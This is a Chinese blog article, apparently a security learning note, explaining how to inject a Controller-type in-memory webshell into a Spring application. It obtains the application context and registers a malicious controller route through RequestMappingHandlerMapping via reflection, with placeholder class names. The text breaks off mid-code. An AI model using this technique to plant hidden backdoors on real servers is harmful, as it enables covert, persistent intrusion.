{"title":"Spring型内存马","uid":"64e032b32426815991c1b7bf0ba5ba62","slug":"Spring型内存马分析","date":"2024-03-07T09:50:51.000Z","updated":"2024-06-28T15:09:36.780Z","comments":true,"path":"api/articles/Spring型内存马分析.json","keywords":null,"cover":"https://bu.dusays.com/2024/06/28/667ecfe7b6094.webp","content":"<h1 id=\"1-Spring-特性\"><a href=\"#1-Spring-特性\" class=\"headerlink\" title=\"1 Spring 特性\"></a>1 Spring 特性</h1><h2 id=\"0x01-综述\"><a href=\"#0x01-综述\" class=\"headerlink\" title=\"0x01 综述\"></a>0x01 综述</h2><p>简化来说就是 IOC 和 AOP，中文翻译是控制反转和切面编程。我个人理解：IOC 是把 java 类托管，我们就不需要自己主动去 new 一个类了，按需向 IOC 容器中取就行；AOP 其实我个人感觉很像 JavaAgent，只不过 Spring 实现起来比较简单，写一个配置类和对应的配置文件即可精确定位方法，实现方法执行前，中，后插入代码执行</p>\n<h2 id=\"0x02-Spring-以及-SprinMVC\"><a href=\"#0x02-Spring-以及-SprinMVC\" class=\"headerlink\" title=\"0x02 Spring 以及 SprinMVC\"></a>0x02 Spring 以及 SprinMVC</h2><p>我们由 Spring 特性提取出一段信息：Spring 中的对象都是托管给 IOC 容器去管理的，不论是获取，删除等操作，都是由 IOC 容器去做的<br>至于 Spring 或者 springboot 的一个小 demo，师傅们可以移步至其他基础部分，这里就不多阐述<br>然后必须提的一点是 SpringMVC 的流程，我这里有一张图，然后辅助一些文字描述：</p>\n<ul>\n<li>首先 <code>DispatchServlet</code> 接收到客户端发送过来的请求信息（tomcat 已经处理完信息了，由单独的 servlet 接收），然后 <code>DispatchServlet</code>去调用 HandlerMapping，其主要目的是去完成对应 Controller 的搜索</li>\n<li>找到 Controller 后自然是去执行 Controller 的逻辑，Controller 的逻辑依赖于调用业务逻辑执行，也就是对 Mapper 层的 CRUD 操作，然后 Controller 会将这些处理完之后的数据打包，发送给 <code>ModelAndView</code> 去渲染</li>\n<li><code>ModelAndView</code>渲染完毕，发送给 <code>DispatchServlet</code>，让他去处理对应的前端渲染相关工作</li>\n<li>最后<code>DispatchServlet</code>终于返回到了前端，也就是用户看到的数据</li>\n</ul>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709431796433-fc555bfe-d4fa-4203-a47e-aaa6492e306e.png#averageHue=%23f9f9f9&from=url&id=q9Asb&originHeight=567&originWidth=1091&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=\" referrerpolicy=\"no-referrer\"><br>所以 SpringMVC 的核心点就是 <code>DispatchServlet</code>，它起到了一个中轴的作用，之后的分析会着重于它</p>\n<h2 id=\"0x03-IOC-容器\"><a href=\"#0x03-IOC-容器\" class=\"headerlink\" title=\"0x03 IOC 容器\"></a>0x03 IOC 容器</h2><p>Spring 中 IOC 的中文翻译：<strong>控制反转</strong>，我个人理解为，程序员不用再去过多的处理类的创建和配置，专心于控制逻辑的设计，到需要用到 java 对象时再从容器中取出就行<br>Spring 框架中<code> BeanFactory</code>接口就是 <code>spring</code> IOC 容器的实际代表者，但是 一个 IOC 不可能只单单有这些功能，还需要获取 sources 资源，以及字符转化等功能，所以最终 <code>ApplicationContext</code> 就来继承一些必要的接口（<code>BeanFactory</code> 肯定包含在内），作为 IOC 容器</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709725402899-cda2d1c4-e64f-40aa-a355-8f295de97b65.png#averageHue=%232d2d2d&clientId=u6003de45-a3b1-4&from=paste&height=174&id=ua241b277&originHeight=261&originWidth=1509&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=30665&status=done&style=none&taskId=u2bd84fd0-f00c-409a-91d1-395959d52c4&title=&width=1006\" referrerpolicy=\"no-referrer\" alt=\"图片-55.png\"><br>每一个 dispatchservlet 都代表着一段完整的逻辑链，我们在学习的时候一般都是一个 web 程序有一个 dispatchservlet，而一个 dispatchservlet 的创建就代表着一个 <code>child context</code>型的 IOC 容器被创建了，有 child 必有 Root（not father），Spring 中的 <code>Root Context</code>是伴随着 ContextLoaderListener 创建的，这也是全局唯一一个公共的 IOC 容器<br>前面也提到了，IOC 容器的代表者是 <code>ApplicationContext</code>，当然这个 child 的 IOC 容器。<br>Root 的 IOC 容器叫做 <code>WebApplicationContext</code>，所有的 child 可以取访问 Root 容器，但是 Root 却不能去访问 Child 中的内容<br>随着每一个 Context 被创建，都会被最为属性存入 Tomcat 中的 <code>ServletContext</code></p>\n<p>讲了这么多，其实是为了解决动态注册 Controller 等 Spring 中常用且可用组件注册的问题，也就引出了我们如何注入 Spring 型内存马的整体思路：</p>\n<ul>\n<li>获取到上下文环境内容</li>\n<li>注册恶意组件</li>\n<li>配置路径映射</li>\n</ul>\n<h1 id=\"2-Controller-型内存马\"><a href=\"#2-Controller-型内存马\" class=\"headerlink\" title=\"2 Controller 型内存马\"></a>2 Controller 型内存马</h1><h2 id=\"0x01-为什么是-Controller？\"><a href=\"#0x01-为什么是-Controller？\" class=\"headerlink\" title=\"0x01 为什么是 Controller？\"></a>0x01 为什么是 Controller？</h2><p>刚开始学内存马的 filter，listener，servlet 等类型的最直观的体现：我们通过某个特定的路由去访问内存马，都是作用于路由，我们客户端能够访问到，而 Spring 中最直观的路由逻辑的体现就是 Controller 了</p>\n<h2 id=\"0x02-实现分析\"><a href=\"#0x02-实现分析\" class=\"headerlink\" title=\"0x02 实现分析\"></a>0x02 实现分析</h2><h3 id=\"1x01-获取到上下文内容\"><a href=\"#1x01-获取到上下文内容\" class=\"headerlink\" title=\"1x01 获取到上下文内容\"></a>1x01 获取到上下文内容</h3><h4 id=\"总计四种方法\"><a href=\"#总计四种方法\" class=\"headerlink\" title=\"总计四种方法\"></a>总计四种方法</h4><h4 id=\"1-ContextLoaderListener\"><a href=\"#1-ContextLoaderListener\" class=\"headerlink\" title=\"1 ContextLoaderListener\"></a>1 <code>ContextLoaderListener</code></h4><p>这种方法是获取的当前 <code>ContextLoaderListener</code>创建的 Root <code>WebApplicationContext</code></p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">WebApplicationContext</span><span style=\"color: #B392F0\"> context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">ContextLoader</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getCurrentWebApplicationContext();</span></span></code></pre></div><h5 id=\"2-WebApplicationContextUtils\"><a href=\"#2-WebApplicationContextUtils\" class=\"headerlink\" title=\"2  WebApplicationContextUtils\"></a>2  WebApplicationContextUtils</h5><p>这个工具类的<code>getWebApplicationContext</code> 方法也是获取的 <code>ContextLoaderListener</code> 创建的 <code>Root WebApplicationContext </code></p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">WebApplicationContext</span><span style=\"color: #B392F0\"> context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">WebApplicationContextUtils</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWebApplicationContext(</span><span style=\"color: #79B8FF\">RequestContextUtils</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWebApplicationContext(((ServletRequestAttributes)</span><span style=\"color: #79B8FF\">RequestContextHolder</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">currentRequestAttributes())</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getRequest())</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getServletContext());</span></span></code></pre></div><p>其实这个类的 <code> getRequiredWebApplicationContext</code>也能够获取到 <code>RootContext</code><br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709730801343-a2937304-ff50-4dfd-bb03-c40c99d8cfcd.png#averageHue=%233c4650&clientId=u6003de45-a3b1-4&from=paste&height=69&id=u1f70e752&originHeight=104&originWidth=891&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=73439&status=done&style=none&taskId=ufeace79f-7c8a-4f3d-80f0-7cb9412aecd&title=&width=594\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709730846358-28cf3358-c44f-4c30-b887-984f97aa1050.png#averageHue=%233c424c&clientId=u6003de45-a3b1-4&from=paste&height=244&id=u06599f56&originHeight=366&originWidth=1928&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=286665&status=done&style=none&taskId=u8dd35f0d-9348-4c81-b36f-fe9e76a41d2&title=&width=1285.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<p>多讲一嘴这个 <code>getWebApplicationContext</code>方法是如何获取到 Root Context 的：<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709730979937-a3b154b2-e4b1-4075-9589-ce6dfbafec94.png#averageHue=%233c424b&clientId=u6003de45-a3b1-4&from=paste&height=514&id=ude405a52&originHeight=771&originWidth=1835&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=650512&status=done&style=none&taskId=u8a810bed-9e16-40be-ab42-85487ea234e&title=&width=1223.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>它其实是从 Servlet 中直接通过键值对取出的 RootContext<br>在这个 Utils 获取 WAC 的整体的逻辑中，最终都是调用到了 <code>getWebApplicationContext</code>来获取</p>\n<h5 id=\"3-RequestContextUtils\"><a href=\"#3-RequestContextUtils\" class=\"headerlink\" title=\"3 RequestContextUtils\"></a>3 RequestContextUtils</h5><div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">WebApplicationContext</span><span style=\"color: #B392F0\"> context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">RequestContextUtils</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWebApplicationContext(((ServletRequestAttributes)</span><span style=\"color: #79B8FF\">RequestContextHolder</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">currentRequestAttributes())</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getRequest());</span></span></code></pre></div><p>这个类的 <code>getWebApplicationContext</code>方法现在改成了 <code>findWebApplicationContext</code>方法<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709731151448-e7a90656-391c-4769-b991-2fade9fca53f.png#averageHue=%233c434c&clientId=u6003de45-a3b1-4&from=paste&height=410&id=ucb7e4fb4&originHeight=615&originWidth=2100&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=547031&status=done&style=none&taskId=u1c72435c-2439-4492-ac4a-d5d44f97eae&title=&width=1400\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<h5 id=\"4-getAttribute\"><a href=\"#4-getAttribute\" class=\"headerlink\" title=\"4 getAttribute\"></a>4 getAttribute</h5><div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">WebApplicationContext</span><span style=\"color: #B392F0\"> context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (WebApplicationContext)</span><span style=\"color: #79B8FF\">RequestContextHolder</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">currentRequestAttributes()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getAttribute(</span><span style=\"color: #FFAB70\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F8F8F8\">0</span><span style=\"color: #B392F0\">);</span></span></code></pre></div><p>这个是从 ServletContext 中获取</p>\n<h3 id=\"1x02-动态注册-Controller\"><a href=\"#1x02-动态注册-Controller\" class=\"headerlink\" title=\"1x02 动态注册 Controller\"></a>1x02 动态注册 Controller</h3><h4 id=\"2x01-如何获取到映射注册器\"><a href=\"#2x01-如何获取到映射注册器\" class=\"headerlink\" title=\"2x01 如何获取到映射注册器\"></a>2x01 如何获取到映射注册器</h4><p>回顾 MVC 的控制流程，接受到客户端发送的信息之后，调用 <code>HandlerMapping</code>去找对应的 Controller 处理逻辑。这里的 <code>HandlerMapping</code>其实指的是 <code>RequestMappingHandlerMapping</code><br><code>RequestMappingHandlerMapping</code>是 Spring 中一个十分重要的 bean，Spring 会先把 Controller 解析成<code>RequestMappingInfo</code>对象，然后再注册进<code>RequestMappingHandlerMapping</code>中，这样请求才能够从 <code>RequestMappingHandlerMapping</code>中找到对应的 Controller<br>那么现在的目标是如何获取到<code>RequestMappingHandlerMapping</code>并向<code>RequestMappingHandlerMapping</code>中注册 Controller<br>一个一个解决问题：</p>\n<ol>\n<li>获取 <code>RequestMappingHandlerMapping</code>本身并不难，Spring 对于这么重要类当然是自己事先就注册好了的，存放于 IOC 容器中，所以我们只需要获取上下文，然后通过取键值对得到—-&gt;而一个 web 程序来说，肯定会有一个 dispatchservlet 以及它创建的 <code>ApplicationContext</code>，还有一个<code>ContextLoaderListener</code>创建的 <code>WebApplicationContext</code>,并且在<code>dispatchservlet</code> 创建的过程中就已经把 <code>RequestMappingHandlerMapping</code>注册好，装进其 IOC 容器了</li>\n<li>通过 <code>dispatchservlet</code>的 IOC 容器获取到 <code>RequestMappingHandlerMapping</code>之后就是注册了映射路由了  但是请注意： Spring 2.5 开始到 Spring 3.1 之前一般使用<br><code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br>映射器 ；   Spring 3.1 开始及以后一般开始使用新的  <code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code> 映射器来支持@Contoller和@RequestMapping注解。</li>\n</ol>\n<h5 id=\"针对于-RequestMappingHandlerMapping-映射器的获取和注册\"><a href=\"#针对于-RequestMappingHandlerMapping-映射器的获取和注册\" class=\"headerlink\" title=\"针对于  RequestMappingHandlerMapping 映射器的获取和注册\"></a>针对于  RequestMappingHandlerMapping 映射器的获取和注册</h5><p>整理一下通过<code>RequestMappingHandlerMapping</code>的父类 <code>Abstract**HandlerMethod**Mapping</code>注册实现的伪代码：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #6B737C\">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">RequestMappingHandlerMapping</span><span style=\"color: #B392F0\"> r </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getBean(</span><span style=\"color: #79B8FF\">RequestMappingHandlerMapping</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #6B737C\">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">Method</span><span style=\"color: #B392F0\"> method </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;evilMethod&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredMethods())[</span><span style=\"color: #F8F8F8\">0</span><span style=\"color: #B392F0\">];</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #6B737C\">// 3. 定义访问 controller 的 URL 地址</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">PatternsRequestCondition</span><span style=\"color: #B392F0\"> url </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> PatternsRequestCondition(</span><span style=\"color: #FFAB70\">&quot;/hahaha&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #6B737C\">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">RequestMethodsRequestCondition</span><span style=\"color: #B392F0\"> ms </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> RequestMethodsRequestCondition();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #6B737C\">// 5. 在内存中动态注册 controller</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">RequestMappingInfo</span><span style=\"color: #B392F0\"> info </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> RequestMappingInfo(url</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> ms</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #79B8FF\">r</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">registerMapping(info</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;恶意Controller&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">newInstance()</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> method);</span></span></code></pre></div><p>在其父类 <code>Abstract**HandlerMethod**Mapping</code>中其实还有一个方法可以用来注册路由映射–<code>detectHandlerMethods</code></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709737009610-7cb402ad-17a3-4c15-b4c3-d6ae2323fcb7.png#averageHue=%233d434c&clientId=u9af1806a-7a9b-4&from=paste&height=670&id=u04bf8f66&originHeight=1005&originWidth=1745&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=816298&status=done&style=none&taskId=ue9804de3-6f8b-4779-a568-9bc8f6e5ce6&title=&width=1163.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>逻辑为接受一个任意类型的 handler 参数，然后在 IOC 容器中找寻这个名字 bean 进行注册\t\t<br>贴一下实现的伪代码：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getBeanFactory()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">registerSingleton(</span><span style=\"color: #FFAB70\">&quot;dynamicController&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;恶意Controller&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">newInstance());</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">mvc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">method</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">RequestMappingHandlerMapping</span><span style=\"color: #B392F0\"> requestMappingHandlerMapping </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getBean(</span><span style=\"color: #79B8FF\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">mvc</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">method</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">RequestMappingHandlerMapping</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Method</span><span style=\"color: #B392F0\"> m1 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">handler</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">AbstractHandlerMethodMapping</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredMethod(</span><span style=\"color: #FFAB70\">&quot;detectHandlerMethods&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Object</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #79B8FF\">m1</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #79B8FF\">m1</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">invoke(requestMappingHandlerMapping</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;dynamicController&quot;</span><span style=\"color: #B392F0\">);</span></span></code></pre></div><p>针对于 DefaultAnnotationHandlerMapping 的注册映射<br>对于 Spring 2.5 开始到 Spring 3.1  的<code>DefaultAnnotationHandlerMapping</code>映射注册（不会现在还有人在用吧），我们可以跟踪到它的顶级父类 <code>AbstractUrlHandlerMapping</code>，其中有这么一段方法</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">protected</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> registerHandler(</span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> urlPath</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> handler) throws BeansException</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> IllegalStateException &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">Assert</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">notNull(urlPath</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;URL path must not be null&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">Assert</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">notNull(handler</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;Handler object must not be null&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> resolvedHandler </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> handler;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">// Eagerly resolve handler if referencing singleton via name.</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">!</span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">lazyInitHandlers</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> handler </span><span style=\"color: #F97583\">instanceof</span><span style=\"color: #B392F0\"> String) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> handlerName </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (String) handler;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">ApplicationContext</span><span style=\"color: #B392F0\"> applicationContext </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> obtainApplicationContext();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">applicationContext</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">isSingleton(handlerName)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                resolvedHandler </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">applicationContext</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getBean(handlerName);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> mappedHandler </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">handlerMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(urlPath);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (mappedHandler </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (mappedHandler </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> resolvedHandler) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">throw</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> IllegalStateException(</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #FFAB70\">&quot;Cannot map &quot;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">+</span><span style=\"color: #B392F0\"> getHandlerDescription(handler) </span><span style=\"color: #F97583\">+</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot; to URL path [&quot;</span><span style=\"color: 